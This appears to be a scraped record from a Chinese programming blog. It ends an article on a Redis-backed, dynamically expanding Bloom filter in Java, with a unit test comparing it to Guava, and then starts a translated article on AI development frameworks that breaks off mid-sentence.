class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-88\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-89\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-90\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">PipelineExecutor </span><span class=\"crayon-e\">apply</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">PipelineExecutor </span><span class=\"crayon-v\">executor</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-91\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">executor</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-92\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-93\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0165 seconds] -->\r\n<p>下面我们做一个单元测试来验证其正确性。</p>\n<p>如果我们插入的数量等于原预计总数，RedisBloomFilter扩容了1次，而两个布隆过滤器的结果一致，都为false,true,false。</p>\n<p>如果插入的数量为原预计总数的3倍，RedisBloomFilter扩容了3次，并且仍判断正确，而Guava布隆过滤器则在判断str3时出现误判。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359b36cb5c916876310\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Java</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npublic class TestRedisBloomFilter {\r\n\r\n    private static final int TOTAL = 10000;\r\n    private static final double FPP = 0.0005;\r\n\r\n    @ Test\r\n    public void test() {\r\n        RedisBloomFilter redisBloomFilter = RedisBloomFilter.create(TOTAL, FPP);\r\n        redisBloomFilter.resetBitmap();\r\n        BloomFilter&lt;String&gt; bloomFilter = BloomFilter.create(Funnels.stringFunnel(Charsets.UTF_8), TOTAL, FPP);\r\n\r\n        IntStream.range(0, /* 3* */TOTAL).boxed()\r\n                .map(i -&gt; Hashing.md5().hashInt(i).toString())\r\n                .collect(toList()).forEach(s -&gt; {\r\n            redisBloomFilter.put(s);\r\n            bloomFilter.put(s);\r\n        });\r\n\r\n        String str1 = Hashing.md5().hashInt(99999).toString();\r\n        String str2 = Hashing.md5().hashInt(9999).toString();\r\n        String str3 = \"abcdefghijklmnopqrstuvwxyz123456\";\r\n        System.out.println(redisBloomFilter.mightContain(str1) + \":\" + bloomFilter.mightContain(str1));\r\n        System.out.println(redisBloomFilter.mightContain(str2) + \":\" + bloomFilter.mightContain(str2));\r\n        System.out.println(redisBloomFilter.mightContain(str3) + \":\" + bloomFilter.mightContain(str3));\r\n    }\r\n}\r\n&gt;&gt;\r\ngrow bloomfilter-1\r\nfalse:false\r\ntrue:true\r\nfalse:false\r\n&gt;&gt;\r\ngrow bloomfilter-1\r\ngrow bloomfilter-2\r\ngrow bloomfilter-3\r\nfalse:false\r\ntrue:true\r\nfalse:true</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb5c916876310-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb5c916876310-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb5c916876310-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb5c916876310-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb5c916876310-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb5c916876310-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb5c916876310-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb5c916876310-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb5c916876310-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb5c916876310-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb5c916876310-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb5c916876310-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb5c916876310-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb5c916876310-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb5c916876310-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb5c916876310-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb5c916876310-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb5c916876310-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb5c916876310-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb5c916876310-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb5c916876310-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb5c916876310-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb5c916876310-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb5c916876310-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb5c916876310-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb5c916876310-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb5c916876310-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb5c916876310-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb5c916876310-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb5c916876310-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb5c916876310-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb5c916876310-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb5c916876310-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb5c916876310-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb5c916876310-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb5c916876310-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb5c916876310-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb5c916876310-38\">38</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359b36cb5c916876310-1\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">TestRedisBloomFilter</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb5c916876310-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb5c916876310-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TOTAL</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10000</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb5c916876310-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">double</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">FPP</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.0005</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb5c916876310-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb5c916876310-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">@</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Test</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb5c916876310-7\"><span class=\"crayon-e\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">test</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb5c916876310-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">RedisBloomFilter </span><span class=\"crayon-v\">redisBloomFilter</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">RedisBloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">create</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">TOTAL</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">FPP</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb5c916876310-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">redisBloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">resetBitmap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb5c916876310-10\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-e \">&lt;String&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">create</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Funnels</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">stringFunnel</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Charsets</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">UTF_8</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TOTAL</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">FPP</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb5c916876310-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb5c916876310-12\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">IntStream</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">/* 3* */</span><span class=\"crayon-v\">TOTAL</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">boxed</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb5c916876310-13\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">map</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Hashing</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">md5</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">hashInt</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">toString</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb5c916876310-14\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">collect</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">toList</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-st\">forEach</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb5c916876310-15\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">redisBloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">s</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb5c916876310-16\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">s</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb5c916876310-17\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb5c916876310-18\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb5c916876310-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">str1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Hashing</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">md5</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">hashInt</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">99999</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">toString</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb5c916876310-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">str2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Hashing</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">md5</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">hashInt</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">9999</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">toString</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb5c916876310-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">str3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"abcdefghijklmnopqrstuvwxyz123456\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb5c916876310-22\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">redisBloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">str1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\":\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">str1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb5c916876310-23\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">redisBloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">str2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\":\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">str2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb5c916876310-24\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">redisBloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">str3</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\":\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">str3</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb5c916876310-25\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb5c916876310-26\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb5c916876310-27\"><span class=\"crayon-o\">&gt;&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb5c916876310-28\"><span class=\"crayon-e\">grow </span><span class=\"crayon-v\">bloomfilter</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb5c916876310-29\"><span class=\"crayon-t\">false</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">false</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb5c916876310-30\"><span class=\"crayon-t\">true</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">true</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb5c916876310-31\"><span class=\"crayon-t\">false</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">false</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb5c916876310-32\"><span class=\"crayon-o\">&gt;&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb5c916876310-33\"><span class=\"crayon-e\">grow </span><span class=\"crayon-v\">bloomfilter</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb5c916876310-34\"><span class=\"crayon-e\">grow </span><span class=\"crayon-v\">bloomfilter</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb5c916876310-35\"><span class=\"crayon-e\">grow </span><span class=\"crayon-v\">bloomfilter</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">3</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb5c916876310-36\"><span class=\"crayon-t\">false</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">false</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb5c916876310-37\"><span class=\"crayon-t\">true</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">true</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb5c916876310-38\"><span class=\"crayon-t\">false</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">true</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0070 seconds] -->\r\n<p>综上，本文利用了Guava布隆过滤器的思想，并结合Redis中的Bitmaps等特性实现了支持动态扩容的布隆过滤器，它将布隆过滤器底层的位数据装载到了Redis数据库中，这样的好处在于可以部署在更复杂的多应用或分布式系统中，还可以利用Redis完成持久化，定时过期等功能。</p>\n<p><strong>四、参考文献</strong></p>\n<ol>\n<li>吴军. 数学之美[M]. 人民邮电出版社, 2012.</li>\n<li>Kirsch A, Mitzenmacher M. Less hashing, same performance: building a better bloom filter[C]//ESA. 2006, 6: 456-467.</li>\n<li>Bloom Filters for the Perplexed, https://sagi.io/2017/07/bloom-filters-for-the-perplexed/</li>\n<li>Google Guava, https://github.com/google/guava</li>\n</ol>\n</div>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113396\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113396votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113396\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/2653yy\">fullstackyang</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/2653yy\">\r\n\t\t\t<img src=\"http://tp2.sinaimg.cn/2233098320/180/0/1\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            会当凌绝顶，一览众山小——全栈之路        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/2653yy\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/2653yy/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/2653yy/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 7</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://www.fullstackyang.com\"><i class=\"fa fa-link\"></i></a> <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/2653yy\"><i class=\"fa fa-weibo\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/98bb9228f02f68efac9268ed6a26dad9a00ce1c5.jpg"}
{"url_object_id": "779ed9fa24a799a2c0bbfc7a4dcb5020", "title": "10 个用于 AI 开发的框架和库", "url": "http://blog.jobbole.com/113499/", "create_date": "2018/01/19", "front_img_url": ["https://dashbouquet.com/assets/img/blog/tensorflow-example.png"], "praise_nums": 1, "comment_nums": 0, "favor_nums": 1, "tags": "IT技术,人工智能", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/zhj318\">飞哥的咖啡</a> 翻译。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://dashbouquet.com/blog/web-development/progressive-tools-10-great-frameworks-and-libraries-for-ai\">dashbouquet</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>尽管人工智能（AI ）已经存在很长时间了，但因为这一领域取得的巨大进步，它最近成为了一个流行词。</p>\n<p>AI 曾被认为是狂热爱好者和天才的专属领域，但由于各种库和框架的蓬勃发展，它慢慢成为了一个不那么排外的 IT 领域，并吸引了大量的人才投入其中。</p>\n<p>在本文中，我们将介绍那些用于 AI 开发的高质量库，并谈谈它们的优缺点，以及特性。</p>\n<p>现在，让我们进入并探索 AI 